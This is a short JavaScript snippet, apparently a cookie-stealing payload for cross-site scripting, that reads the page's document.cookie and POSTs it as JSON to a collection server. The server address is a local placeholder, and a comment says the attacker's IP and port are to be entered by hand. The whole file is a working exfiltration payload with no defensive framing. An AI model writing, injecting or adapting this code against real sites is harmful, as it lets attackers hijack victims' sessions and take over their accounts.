const cookies = document.cookie;

fetch('http://127.0.0.1:3000/cookies', { // It is necessary to enter the ip and port manually.
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ cookies })
})
.then(response => response.text())
.then(data => {
    console.log('Respuesta del servidor:', data);
})
.catch(error => console.error('Error:', error));